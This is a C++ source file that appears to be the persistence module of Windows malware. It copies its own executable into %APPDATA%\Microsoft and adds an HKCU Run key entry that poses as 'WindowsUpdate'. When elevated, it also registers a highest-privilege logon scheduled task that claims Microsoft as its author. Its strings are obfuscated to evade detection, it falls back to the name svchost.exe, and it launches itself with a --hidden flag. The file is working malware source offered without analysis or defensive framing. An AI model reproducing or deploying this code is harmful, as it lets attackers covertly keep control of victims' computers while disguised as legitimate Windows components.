#include "persistence.h"
#include <windows.h>
#include <shlobj.h>
#include <comdef.h>
#include <taskschd.h>
#include <iostream>
#include <string>
#include "../include/dvm_str.h"


// Note: #pragma comment() is MSVC-only. MinGW linking is handled in CMakeLists.txt
// #pragma comment(lib, "advapi32.lib")
// #pragma comment(lib, "shell32.lib")
// #pragma comment(lib, "ole32.lib")
// #pragma comment(lib, "oleaut32.lib")
// #pragma comment(lib, "taskschd.lib")

namespace Persistence {

// DVM_STR-protected persistence identifiers: no plaintext residue in the binary.
static std::wstring GetTaskName()  { const char* tn = DVM_STR("WindowsUpdateTask"); std::string s(tn); DVM_FREE(tn); return std::wstring(s.begin(), s.end()); }
static std::string  GetRunValue()  { const char* v = DVM_STR("WindowsUpdate"); std::string s(v); DVM_FREE(v); return s; }
static std::string  GetRunKey()    { const char* k = DVM_STR("Software\\Microsoft\\Windows\\CurrentVersion\\Run"); std::string s(k); DVM_FREE(k); return s; }

bool IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        CheckTokenMembership(NULL, adminGroup, &isAdmin);
        FreeSid(adminGroup);
    }
    return isAdmin != FALSE;
}

static bool CreateScheduledTask(const std::string& exePath) {
    // Convert exe path to wide string
    int wlen = MultiByteToWideChar(CP_UTF8, 0, exePath.c_str(), -1, NULL, 0);
    std::wstring wExePath(wlen - 1, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, exePath.c_str(), -1, &wExePath[0], wlen);

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bool ownCOM = (hr == S_OK || hr == S_FALSE);

    bool success = false;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) goto cleanup;

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) goto cleanup;

    {
        ITaskFolder* pRootFolder = NULL;
        hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
        if (FAILED(hr)) goto cleanup;

        pRootFolder->DeleteTask(_bstr_t(GetTaskName().c_str()), 0);

        ITaskDefinition* pTaskDef = NULL;
        hr = pService->NewTask(0, &pTaskDef);
        if (FAILED(hr)) { pRootFolder->Release(); goto cleanup; }

        // Registration info
        IRegistrationInfo* pRegInfo = NULL;
        pTaskDef->get_RegistrationInfo(&pRegInfo);
        if (pRegInfo) {
            pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
            pRegInfo->Release();
        }

        // Principal: run with highest privileges
        IPrincipal* pPrincipal = NULL;
        pTaskDef->get_Principal(&pPrincipal);
        if (pPrincipal) {
            pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
            pPrincipal->Release();
        }

        // Settings
        ITaskSettings* pSettings = NULL;
        pTaskDef->get_Settings(&pSettings);
        if (pSettings) {
            pSettings->put_StartWhenAvailable(VARIANT_TRUE);
            pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
            pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
            pSettings->put_ExecutionTimeLimit(_bstr_t(L"PT0S")); // no time limit
            pSettings->Release();
        }

        // Trigger: at logon of any user
        ITriggerCollection* pTriggers = NULL;
        pTaskDef->get_Triggers(&pTriggers);
        if (pTriggers) {
            ITrigger* pTrigger = NULL;
            pTriggers->Create(TASK_TRIGGER_LOGON, &pTrigger);
            if (pTrigger) pTrigger->Release();
            pTriggers->Release();
        }

        // Action: execute the binary
        IActionCollection* pActions = NULL;
        pTaskDef->get_Actions(&pActions);
        if (pActions) {
            IAction* pAction = NULL;
            pActions->Create(TASK_ACTION_EXEC, &pAction);
            if (pAction) {
                IExecAction* pExecAction = NULL;
                pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                if (pExecAction) {
                    pExecAction->put_Path(_bstr_t(wExePath.c_str()));
                    pExecAction->put_Arguments(_bstr_t(L"--hidden"));
                    pExecAction->Release();
                }
                pAction->Release();
            }
            pActions->Release();
        }

        // Register the task
        IRegisteredTask* pRegistered = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(GetTaskName().c_str()),
            pTaskDef,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),     // no user (system)
            _variant_t(),     // no password
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegistered);
        if (SUCCEEDED(hr)) {
            success = true;
            pRegistered->Release();
        }

        pTaskDef->Release();
        pRootFolder->Release();
    }

cleanup:
    if (pService) pService->Release();
    if (ownCOM)   CoUninitialize();
    return success;
}

static bool RemoveScheduledTask() {
    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    bool ownCOM = (hr == S_OK || hr == S_FALSE);
    bool success = false;

    ITaskService* pService = NULL;
    hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (SUCCEEDED(hr)) {
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
        if (SUCCEEDED(hr)) {
            ITaskFolder* pRootFolder = NULL;
            if (SUCCEEDED(pService->GetFolder(_bstr_t(L"\\"), &pRootFolder))) {
                success = SUCCEEDED(pRootFolder->DeleteTask(_bstr_t(GetTaskName().c_str()), 0));
                pRootFolder->Release();
            }
        }
        pService->Release();
    }
    if (ownCOM) CoUninitialize();
    return success;
}

// Get the full path of the current executable
std::string GetExecutablePath() {
    typedef DWORD(WINAPI* pGetModuleFileNameA_t)(HMODULE, LPSTR, DWORD);
    pGetModuleFileNameA_t _GetModuleFileNameA = (pGetModuleFileNameA_t)GetModuleFileNameA;
    char path[MAX_PATH];
    DWORD result = _GetModuleFileNameA ? _GetModuleFileNameA(NULL, path, MAX_PATH) : GetModuleFileNameA(NULL, path, MAX_PATH);
    if (result == 0 || result == MAX_PATH) return "";
    return std::string(path);
}

// Get just the executable name from the full path
std::string GetExecutableName() {
    std::string fullPath = GetExecutablePath();
    
    size_t lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        return fullPath.substr(lastSlash + 1);
    }
    
    return fullPath;
}

// Copies the binary to %APPDATA%\Microsoft\<exename> so persistence always
// points to a stable location independent of where it was launched from.
std::string CopySelfToAppData() {
    // Resolve %APPDATA%
    typedef HRESULT(WINAPI* pSHGetFolderPathA_t)(HWND, int, HANDLE, DWORD, LPSTR);
    pSHGetFolderPathA_t _SHGetFolderPathA = (pSHGetFolderPathA_t)SHGetFolderPathA;

    char appDataPath[MAX_PATH] = {0};
    // CSIDL_APPDATA = 0x001a
    if (_SHGetFolderPathA) {
        _SHGetFolderPathA(NULL, 0x001a, NULL, 0, appDataPath);
    } else {
        SHGetFolderPathA(NULL, 0x001a, NULL, 0, appDataPath);
    }
    if (appDataPath[0] == '\0') return "";

    std::string srcPath = GetExecutablePath();
    if (srcPath.empty()) return "";

    std::string exeName = GetExecutableName();
    if (exeName.empty()) exeName = "svchost.exe";

    // Build destination: %APPDATA%\Microsoft\<exename>
    std::string _msDir = std::string(appDataPath) + "\\Microsoft";
    std::string destPath = _msDir + "\\" + exeName;

    // If we're already running from that path, nothing to do.
    if (srcPath == destPath) return destPath;

    // Ensure %APPDATA%\Microsoft\ exists (it always should, but be safe)
    typedef BOOL(WINAPI* pCreateDirectoryA_t)(LPCSTR, LPSECURITY_ATTRIBUTES);
    pCreateDirectoryA_t _CreateDirectoryA = (pCreateDirectoryA_t)CreateDirectoryA;
    if (_CreateDirectoryA) _CreateDirectoryA(_msDir.c_str(), NULL);

    // Copy — overwrite any existing copy
    typedef BOOL(WINAPI* pCopyFileA_t)(LPCSTR, LPCSTR, BOOL);
    pCopyFileA_t _CopyFileA = (pCopyFileA_t)CopyFileA;
    BOOL ok = _CopyFileA ? _CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE)
                         : CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE);
    if (!ok) return "";

    return destPath;
}

// Persistence is belt-and-suspenders: always register the HKCU Run key
// (reliable, fires at user logon), and additionally a logon scheduled task
// when running elevated.
bool AddToStartup() {
    // Copy to AppData first so persistence points to a stable path.
    std::string persistPath = CopySelfToAppData();
    if (persistPath.empty()) {
        // Fall back to current location if copy fails.
        persistPath = GetExecutablePath();
    }
    if (persistPath.empty()) {
        return false;
    }

    bool ok = false;

    // 1) HKCU Run key (always, no admin needed).
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        std::string runCmd = "\"" + persistPath + "\" --hidden";
        if (RegSetValueExA(hKey, GetRunValue().c_str(), 0, REG_SZ,
                (const BYTE*)runCmd.c_str(), (DWORD)(runCmd.length() + 1)) == ERROR_SUCCESS) {
            ok = true;
        }
        RegCloseKey(hKey);
    }

    // 2) Logon scheduled task (bonus when elevated).
    if (IsRunningAsAdmin() && CreateScheduledTask(persistPath)) {
        ok = true;
    }

    return ok;
}

// Removes both the scheduled task and the Run key (whichever exists).
bool RemoveFromStartup() {
    bool removedTask = RemoveScheduledTask();
    bool removedReg = false;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, GetRunKey().c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        removedReg = (RegDeleteValueA(hKey, GetRunValue().c_str()) == ERROR_SUCCESS);
        RegCloseKey(hKey);
    }

    return removedTask || removedReg;
}

} // namespace Persistence
